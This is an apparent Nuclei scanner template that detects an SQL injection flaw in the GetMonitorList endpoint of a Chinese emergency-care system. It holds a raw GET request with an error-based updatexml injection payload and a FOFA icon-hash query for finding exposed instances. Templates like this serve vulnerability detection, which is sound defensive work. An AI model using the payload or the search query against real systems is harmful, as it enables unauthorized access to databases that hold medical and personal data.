http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - 'XPATH syntax error:'
            - qpkvqqqjpq
        - status:
            - 500
          type: status
      matchers-condition: and
      raw:
        - |
          GET /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetMonitorList?UserID=1&OperatorID=1&SearchName=string%27%26%26+updatexml(1,CONCAT_WS(0x71706b7671,1,0x71716a7071),1)+%26%26%27 HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
id: bianque-GetMonitorList-sql
info:
    author: Superhero
    description: |-
        fofa: icon_hash="-757866684" || icon_hash="-1206146847"
        扁鹊飞救智能急救与质控系统 GetMonitorList 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 扁鹊飞救智能急救与质控系统 GetMonitorList SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/MKxuDdXHf8Q6EY8rN4tdvA
    severity: high
    tags:
        - AppServ
        - appserv
        - 扁鹊飞救智能急救与质控系统
